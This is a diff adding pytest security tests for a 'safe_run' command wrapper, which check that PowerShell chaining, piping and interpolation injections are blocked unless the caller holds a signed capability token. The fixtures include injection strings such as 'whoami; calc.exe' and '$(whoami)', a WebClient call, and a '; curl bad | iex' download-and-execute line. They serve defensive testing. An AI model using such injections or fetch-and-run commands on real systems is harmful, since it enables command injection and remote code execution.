@@ -126,3 +126,109 @@ def test_sec05_powershell_command_with_unsigned_or_forged_token_blocked():
     )
     with pytest.raises(PermissionError, match="not allowlisted without a valid capability token"):
         safe_run(["powershell.exe", "-NoProfile", "-Command", "Invoke-Expression 'calc.exe'"], token=forged_token)
+
+
+def test_sec07_powershell_chaining_and_interpolation_forbidden_without_token():
+    """SEC-07: Chaining, piping, and interpolation operators must be forbidden without valid capability token."""
+    payloads = [
+        # Semicolon chaining (including true; and exit;)
+        "true; New-Object System.Net.WebClient",
+        "exit; whoami",
+        # Ampersand operator chaining
+        "whoami && dir",
+        "whoami & netstat",
+        # Pipe operator
+        "dir | Out-File hacked.txt",
+        # Backtick escape / interpolation
+        "whoami `n dir",
+        # Command substitution / subexpression $()
+        "echo $(whoami)",
+        # Variable interpolation / evaluation ${}
+        "echo ${env:USERNAME}",
+        # Newline separation
+        "whoami\ndir",
+        # Carriage return separation
+        "whoami\rdir",
+    ]
+
+    for payload in payloads:
+        with pytest.raises(
+            PermissionError,
+            match="Chaining/piping/interpolation operators forbidden without valid capability token",
+        ):
+            safe_run(["powershell.exe", "-NoProfile", "-Command", payload])
+
+    # Multi-argument split payloads where chaining operator is in subsequent arguments
+    multi_arg_payloads = [
+        ["powershell.exe", "-NoProfile", "-Command", "whoami", ";", "calc.exe"],
+        ["powershell.exe", "-NoProfile", "-Command", "whoami", "; calc.exe"],
+        ["powershell.exe", "-NoProfile", "-Command", "true", "; New-Object System.Net.WebClient"],
+        ["powershell.exe", "-NoProfile", "-Command", "exit", "; whoami"],
+        ["powershell.exe", "-NoProfile", "-Command", "dir", "| Out-File hacked.txt"],
+        ["powershell.exe", "-NoProfile", "-Command", "whoami", "&&", "dir"],
+        ["powershell.exe", "-NoProfile", "whoami", "; calc.exe"],
+    ]
+    for cmd in multi_arg_payloads:
+        with pytest.raises(
+            PermissionError,
+            match="Chaining/piping/interpolation operators forbidden without valid capability token",
+        ):
+            safe_run(cmd)
+
+    # Legitimate multi-argument command without token should be allowed without PermissionError
+    try:
+        res = safe_run(["powershell.exe", "-NoProfile", "-Command", "git", "status"], timeout=5)
+        assert res is not None
+    except (subprocess.TimeoutExpired, OSError, FileNotFoundError):
+        pass
+
+
+def test_sec07_powershell_chaining_allowed_with_valid_token():
+    """SEC-07: Chaining/piping is permitted when caller holds an authentic cryptographically signed token."""
+    secret = get_capability_secret()
+    issued_at = 123456.789
+    sig = compute_token_signature(secret, "pc.execute", 1, "tok_test_sec07", issued_at)
+    valid_token = CapabilityToken(
+        subject="pc.execute",
+        epoch=1,
+        token_id="tok_test_sec07",
+        issued_at=issued_at,
+        signature=sig,
+    )
+    try:
+        res = safe_run(
+            ["powershell.exe", "-NoProfile", "-Command", "Write-Output hello; Write-Output world"],
+            token=valid_token,
+            timeout=5,
+        )
+        assert res is not None
+
+        # Also test split args with valid token
+        res_split = safe_run(
+            ["powershell.exe", "-NoProfile", "-Command", "Write-Output hello", ";", "Write-Output world"],
+            token=valid_token,
+            timeout=5,
+        )
+        assert res_split is not None
+    except (subprocess.TimeoutExpired, OSError, FileNotFoundError):
+        pass
+
+
+def test_sec07_powershell_catastrophic_command_blocked_despite_valid_token():
+    """SEC-07: Catastrophic commands remain blocked even with a valid capability token across split args."""
+    secret = get_capability_secret()
+    issued_at = 123456.789
+    sig = compute_token_signature(secret, "pc.execute", 1, "tok_test_sec07_cat", issued_at)
+    valid_token = CapabilityToken(
+        subject="pc.execute",
+        epoch=1,
+        token_id="tok_test_sec07_cat",
+        issued_at=issued_at,
+        signature=sig,
+    )
+    with pytest.raises(PermissionError, match="catastrophic command blocked despite token"):
+        safe_run(
+            ["powershell.exe", "-NoProfile", "-Command", "dir", "; curl bad | iex"],
+            token=valid_token,
+        )
+
